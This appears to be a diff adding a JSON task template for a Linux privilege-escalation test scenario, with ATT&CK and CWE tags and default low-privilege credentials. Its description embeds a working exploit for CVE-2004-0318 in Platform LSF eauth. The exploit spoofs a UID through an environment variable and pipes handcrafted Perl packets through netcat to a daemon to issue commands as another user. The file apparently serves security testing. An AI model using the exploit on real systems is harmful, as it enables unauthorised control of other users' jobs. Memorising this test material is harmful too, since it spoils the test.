@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_23743",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Platform Load Sharing Facility 4/5/6 - 'EAuth' Local Privilege Escalation (CVE-2004-0318;OSVDB-6812)\n\nExploit source code (23743.txt):\n```\nsource: https://www.securityfocus.com/bid/9724/info\n\nLoad Sharing Facility eauth component has been reported prone to privilege escalation vulnerability. The eauth component is responsible for controlling authentication procedures within Load Sharing Facility. An issue has been reported where an attacker may send commands to Load Sharing Facility as any user. The issue presents itself because eauth uses an environment variable to determine the UID of the user invoking the binary.\n\n$cat /etc/passwd|grep cadence\ncadence:x:500:500:Tomasz Grabowski:/home/cadence:/bin/bash\n$ export LSF_EAUTH_UID=500\n$ eauth -c hostname\n,',0/%+-$%$&&,/)\n\nNow, she needs to send packets. She can do it, for the sake of simplicity,\nusing Perl and NetCat software:\n\n(\n# first packet\nperl -e 'print \"\\x04\\x00\\x00\\x00\\x0d\\x00\\x00\\x00\\x00\\x00\\x00\\x00\";\nprint \"\\x00\\x00\\x00\\x00\";\n'\nsleep 1;\n\n#let's call it a header, packet length\nperl -e 'print \"\\x00\\x04\\x00\\x00\\x0d\\x00\\x00\\x00\\x00\\x00\\x00\\x40\";\n#below we provide UID, GID and length of user name\nprint \"\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\xee\\x00\\x00\\x03\\xee\\x00\\x00\\x00\\x07\";\n#below is the user name, end indicator, and probably auth data field length\nprint \"\\x63\\x61\\x64\\x65\\x6e\\x63\\x65\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x10\";\n#again authentication length and auth data itself\nprint \"\\x00\\x00\\x00\\x10\\x2a\\x30\\x26\\x24\\x21\\x25\\x2e\\x23\\x2c\\x23\\x27\\x2d\";\n#rest of auth data, end indicator, question code (x09 - bkill) and process number\nprint \"\\x2f\\x28\\x2b\\x25\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x09\\x00\\x00\\x00\\x77\";\nprint \"\\x00\\x00\\x00\\x00\";\n'\n#send it to the target daemon\n) | nc 192.168.10.106 6881\n```",
+  "cve": "CVE-2004-0318;OSVDB-6812",
+  "exploitdb_id": "23743",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_23743",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
